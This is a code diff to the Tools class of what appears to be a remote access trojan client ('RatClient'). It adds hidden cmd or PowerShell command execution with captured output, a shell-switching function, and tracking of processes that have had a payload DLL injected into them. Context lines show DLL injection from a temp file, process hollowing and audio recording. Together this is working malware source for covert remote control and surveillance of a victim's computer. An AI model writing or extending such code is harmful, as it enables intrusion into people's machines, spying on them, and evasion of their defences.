@@ -15,6 +15,7 @@ using RatClient.SymetricCrypto;
 using RatClient.AcRSA;
 using System.Text;
 using System.Windows.Forms;
+using static System.Net.Mime.MediaTypeNames;
 
 public class Tools
 {
@@ -153,36 +154,68 @@ public class Tools
         return ar.StopRecording();
     }
 
-    public static byte[] RunCommand(string command)
+	public static byte[] RunCommand(string command, bool addCd = false)
+	{
+		if (string.IsNullOrEmpty(command))
+		{
+			return new byte[1] { 32 };
+		}
+        string filename = Info.MainShell;
+		string arguments = filename == "cmd.exe" ? $"/c {command}"
+				 : filename == "powershell.exe" ? $"-command {command}"
+				 : throw new ArgumentException("Invalid filename.");
+		byte[] outputBytes = null;
+		ProcessStartInfo proc = new ProcessStartInfo();
+		proc.Arguments = arguments;
+		proc.FileName = filename;
+		proc.RedirectStandardOutput = true;
+		proc.RedirectStandardError = true;
+		proc.UseShellExecute = false;
+		proc.CreateNoWindow = true;
+
+		Process process = Process.Start(proc);
+
+		using (MemoryStream ms = new MemoryStream())
+		{
+			process.StandardOutput.BaseStream.CopyTo(ms);
+			process.StandardError.BaseStream.CopyTo(ms);  
+			if (ms.Length > 0)
+			{
+				outputBytes = ms.ToArray();
+			}
+			else
+			{
+				outputBytes = new byte[1] { 32 };
+			}
+		}
+
+		process.WaitForExit();
+		process.Close();
+
+		return buildCommandOutput(outputBytes, addCd);
+	}
+
+    private static byte[] buildCommandOutput(byte[] standartOut, bool addCd = false)
     {
-        byte[] outputBytes = null;
-        ProcessStartInfo proc = new ProcessStartInfo();
-        proc.Arguments = $"/c {command}";
-        proc.FileName = "cmd.exe";
-        proc.RedirectStandardOutput = true;
-        proc.UseShellExecute = false;
-        proc.CreateNoWindow = true;
-        Process process = Process.Start(proc);
-        using (MemoryStream ms = new MemoryStream())
+        if (!addCd)
         {
-            process.StandardOutput.BaseStream.CopyTo(ms);
-            if (ms.Length > 0)
-            {
-                outputBytes = ms.ToArray();
-            }
-            else
-            {
-                outputBytes = new byte[0];
-            }
+			return standartOut;
         }
-        process.WaitForExit();
-        process.Close();
-
-
-        return outputBytes;
+        string part1 = Info.MainShell == "powershell.exe" ? "PS " : "";
+		byte[] fullres = Encoding.UTF8.GetBytes($"{part1}{Directory.GetCurrentDirectory()}>");
+		return fullres.Concat(standartOut).ToArray(); 
     }
 
-    public static string GetUserSid()
+    public static byte[] SwitchShell(string shell)
+    {
+		Console.WriteLine("swithing to powershell");
+		Info.MainShell = "powershell.exe";
+		byte[] output = buildCommandOutput(
+            Encoding.UTF8.GetBytes(Tools.GetBanner(shell)),addCd:true);
+		Console.WriteLine("powershell was set");
+		return output;
+	}
+	public static string GetUserSid()
     {
         string sid;
         string query = "SELECT UserName FROM Win32_ComputerSystem";
@@ -297,7 +330,12 @@ public class Tools
         string path = GetRandomeFile(Path.GetTempPath(),"dll");
 		Console.WriteLine($"creating random file {path}");
 		File.WriteAllBytes(path, payloadDll);
-        return NativeMethods.InjectDll(pid, path) == 0;
+        if( NativeMethods.InjectDll(pid, path) == 0)
+        {
+            Info.AddInjectProcess(pid);
+            return true;
+		}
+        return false;
     }
 
     public static bool ProcessHollowing(string targetPath, byte[] exePayload)
@@ -322,4 +360,26 @@ public class Tools
         }
         return result;
     }
+
+	public static string GetBanner(string file)
+	{
+		var psi = new ProcessStartInfo
+		{
+			FileName = file,
+			RedirectStandardOutput = true,
+			RedirectStandardInput = true,
+			UseShellExecute = false
+		};
+
+		var p = Process.Start(psi);
+		p.StandardInput.WriteLine("exit");
+		string output = p.StandardOutput.ReadToEnd();
+		p.WaitForExit();
+		if (output.Contains("exit"))
+		{
+			string[] result = output.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+			return string.Join("\n\n", result.Take(result.Length - 1).ToArray());
+		}
+		return output;
+	}
 }
